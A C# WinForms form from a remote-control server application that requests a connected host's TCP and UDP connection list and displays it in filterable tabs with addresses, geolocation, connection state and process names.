using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;

namespace RemoteControl.Server
{
    public class FrmNetworkInfo : FrmBase
    {
        private SocketSession _session;
        private ListView _tcpListView;
        private ListView _udpListView;
        private TextBox _filterBox;
        private TabControl _tabControl;
        private Label _statusLabel;
        private List<NetworkConnectionInfo> _allConnections = new List<NetworkConnectionInfo>();

        public FrmNetworkInfo(SocketSession session, string hostName)
        {
            _session = session;
            this.Text = "网络信息 — " + hostName;
            this.Size = new Size(950, 550);
            this.StartPosition = FormStartPosition.CenterScreen;
            InitializeControls();
            RefreshList();
        }

        private void InitializeControls()
        {
            var topPanel = new Panel();
            topPanel.Dock = DockStyle.Top;
            topPanel.Height = 36;
            topPanel.Padding = new Padding(8, 6, 8, 4);

            var filterLabel = new Label();
            filterLabel.Text = "过滤：";
            filterLabel.AutoSize = true;
            filterLabel.Location = new Point(8, 8);

            _filterBox = new TextBox();
            _filterBox.Location = new Point(50, 5);
            _filterBox.Size = new Size(300, 22);
            SetPlaceholder(_filterBox, "地址 / 进程名");
            _filterBox.TextChanged += (s, e) => ApplyFilter();

            var refreshBtn = new Button();
            refreshBtn.Text = "刷新(R)";
            refreshBtn.Location = new Point(370, 4);
            refreshBtn.Size = new Size(75, 26);
            refreshBtn.Click += (s, e) => RefreshList();

            topPanel.Controls.AddRange(new Control[] { filterLabel, _filterBox, refreshBtn });

            _tabControl = new TabControl();
            _tabControl.Dock = DockStyle.Fill;
            _tabControl.Font = new Font("微软雅黑", 9F);

            var tcpTab = new TabPage("TCP");
            var udpTab = new TabPage("UDP");

            _tcpListView = CreateListView(true);
            tcpTab.Controls.Add(_tcpListView);

            _udpListView = CreateListView(false);
            udpTab.Controls.Add(_udpListView);

            _tabControl.TabPages.Add(tcpTab);
            _tabControl.TabPages.Add(udpTab);

            _statusLabel = new Label();
            _statusLabel.Dock = DockStyle.Bottom;
            _statusLabel.Height = 22;
            _statusLabel.ForeColor = Color.Red;
            _statusLabel.Padding = new Padding(8, 4, 0, 0);

            this.Controls.Add(_tabControl);
            this.Controls.Add(_statusLabel);
            this.Controls.Add(topPanel);
        }

        private ListView CreateListView(bool isTcp)
        {
            var lv = new ListView();
            lv.Dock = DockStyle.Fill;
            lv.View = View.Details;
            lv.FullRowSelect = true;
            lv.GridLines = true;
            lv.Columns.Add("本地地址", 200);
            lv.Columns.Add("远端地址", 200);
            lv.Columns.Add("地理位置", 160);
            if (isTcp)
                lv.Columns.Add("状态", 100);
            lv.Columns.Add("PID", 60);
            lv.Columns.Add("进程名", 150);
            return lv;
        }

        private void RefreshList()
        {
            if (_session == null) return;
            _session.Send(ePacketType.PACKET_GET_NETWORK_CONNECTIONS_REQUEST,
                new RequestGetNetworkConnections { IncludeUDP = true });
        }

        public void HandleResponse(ResponseGetNetworkConnections resp)
        {
            if (resp.Connections != null)
            {
                _allConnections = resp.Connections;
            }
            this.BeginInvoke((Action)(() =>
            {
                ApplyFilter();
                this.Text = string.Format("网络信息 — TCP:{0} UDP:{1} | {2}",
                    resp.TcpCount, resp.UdpCount, resp.CollectedAt);
                _statusLabel.Text = string.Format("TCP: {0} 项 | UDP: {1} 项 | 采集于 {2}",
                    resp.TcpCount, resp.UdpCount, resp.CollectedAt);
            }));
        }

        private static void SetPlaceholder(TextBox tb, string placeholder)
        {
            tb.Text = placeholder;
            tb.ForeColor = SystemColors.GrayText;
            tb.Enter += (s, e) =>
            {
                if (tb.Text == placeholder)
                { tb.Text = ""; tb.ForeColor = SystemColors.WindowText; }
            };
            tb.Leave += (s, e) =>
            {
                if (string.IsNullOrEmpty(tb.Text))
                { tb.Text = placeholder; tb.ForeColor = SystemColors.GrayText; }
            };
        }

        private string GetFilterText()
        {
            string txt = (_filterBox.Text ?? "").Trim();
            string placeholder = "地址 / 进程名";
            return (txt == placeholder) ? "" : txt;
        }

        private void ApplyFilter()
        {
            string filter = GetFilterText();
            _tcpListView.Items.Clear();
            _udpListView.Items.Clear();
            foreach (var conn in _allConnections)
            {
                if (filter.Length > 0)
                {
                    if ((conn.LocalAddress ?? "").IndexOf(filter, StringComparison.OrdinalIgnoreCase) < 0
                        && (conn.RemoteAddress ?? "").IndexOf(filter, StringComparison.OrdinalIgnoreCase) < 0
                        && (conn.ProcessName ?? "").IndexOf(filter, StringComparison.OrdinalIgnoreCase) < 0)
                        continue;
                }

                var item = new ListViewItem(
                    string.Format("{0}:{1}", conn.LocalAddress, conn.LocalPort));
                item.SubItems.Add(string.Format("{0}:{1}", conn.RemoteAddress, conn.RemotePort));
                item.SubItems.Add(conn.GeoLocation ?? "");

                if (conn.Protocol == "TCP")
                {
                    item.SubItems.Add(conn.Status ?? "");
                    item.SubItems.Add(conn.ProcessId.ToString());
                    item.SubItems.Add(conn.ProcessName ?? "");
                    _tcpListView.Items.Add(item);
                }
                else
                {
                    item.SubItems.Add(conn.ProcessId.ToString());
                    item.SubItems.Add(conn.ProcessName ?? "");
                    _udpListView.Items.Add(item);
                }
            }
        }
    }
}
